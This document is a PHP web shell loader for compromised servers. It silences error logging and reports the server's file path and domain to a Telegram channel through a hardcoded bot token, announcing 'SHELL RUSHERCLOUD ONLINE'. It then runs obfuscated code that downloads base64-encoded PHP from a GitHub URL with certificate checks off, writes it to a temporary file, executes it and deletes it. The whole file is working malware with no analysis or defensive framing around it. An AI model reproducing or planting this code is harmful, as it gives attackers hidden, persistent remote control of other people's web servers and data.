<?php
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
$hashed_password = '$2y$10$n7OXssNZ0RXYQ.ehxDfjCeema90KbFax4VwOQg6ndtlo2vZxLpska';
$TELEGRAM_BOT_TOKEN = "8266146541:AAF_rizIBOHlBMj-X9Ds9N0owESWfWVKqVo";
$TELEGRAM_CHAT_ID   = "-1003212759603";
$TELEGRAM_TOPIC_ID  = 3;

function sendToTelegram($message)
{
    global $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID;
    $data = [
        'chat_id' => $TELEGRAM_CHAT_ID,
        'message_thread_id' => $TELEGRAM_TOPIC_ID,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    $url = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage";
    @file_get_contents($url . "?" . http_build_query($data));
}
if (!isset($_SESSION['notified'])) {
    $realpath = realpath(__FILE__);
    $msg = "<b>SHELL RUSHERCLOUD ONLINE!</b>\n\n";
    $msg .= "Path: <code>$realpath</code>\n";
    $msg .= "Domain: <code>$_SERVER[SERVER_NAME]</code>\n";
    $msg .= "First Access: " . date("d-m-Y H:i:s");
    sendToTelegram($msg);
    $_SESSION['notified'] = true;
}
if(!defined('ABGEYCYONVZO'))define('ABGEYCYONVZO', 'ABGEYCYO');$GLOBALS[ABGEYCYONVZO]=explode('|;|@|','H*|;|@|3F3E|;|@|6261736536345f6465636f6465|;|@|6375726c5f65786563|;|@|746170|;|@|6375726c5f696e6974|;|@|68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6578616d706c652f7368656c6c2f6d61696e2f76332e706870|;|@|6375726c5f7365746f70745f6172726179|;|@|4355524c4f50545f52455455524e5452414e53464552|;|@|4355524c4f50545f464f4c4c4f574c4f434154494f4e|;|@|4355524c4f50545f555345524147454e54|;|@|4d6f7a696c6c612f352e30|;|@|4355524c4f50545f53534c5f56455249465950454552|;|@|4355524c4f50545f53534c5f564552494659484f5354');unset($ýèäšãß);$ýèäšãß;eval(pack($GLOBALS[ABGEYCYONVZO][(5+6+7-18)*0],$GLOBALS[ABGEYCYONVZO][1]).base64_decode('ZnVuY3Rpb24gZ2V0X2NvbnRlbnRzKCR1cmwpIHsKICAgICRjaCA9IGN1cmxfaW5pdCgkdXJsKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7CiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRk9MTE9XTE9DQVRJT04sIDEpOwogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VTRVJBR0VOVCwgIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgcnY6MzIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8zMi4wIik7CiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsIDApOwogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllIT1NULCAwKTsKICAgICRyZXN1bHQgPSBjdXJsX2V4ZWMoJGNoKTsKICAgIGN1cmxfY2xvc2UoJGNoKTsKICAgIHJldHVybiAkcmVzdWx0Owp9CgokdXJsID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9pUG90YWN5L0JhaGFuL3JlZnMvaGVhZHMvbWFpbi90aW55LnBocCc7CiRlbmNvZGVkX2NvZGUgPSBnZXRfY29udGVudHMoJHVybCk7CiRkZWNvZGVkX2NvZGUgPSBiYXNlNjRfZGVjb2RlKCRlbmNvZGVkX2NvZGUpOwoKJHRlbXBGaWxlID0gdGVtcG5hbShzeXNfZ2V0X3RlbXBfZGlyKCksICd0bXBfcGhwXycpOwpmaWxlX3B1dF9jb250ZW50cygkdGVtcEZpbGUsICRkZWNvZGVkX2NvZGUpOwoKCnJlcXVpcmVfb25jZSAkdGVtcEZpbGU7CnVubGluaygkdGVtcEZpbGUpOw=='));unset($éèâ"†µ);$éèâ"†µ;
?>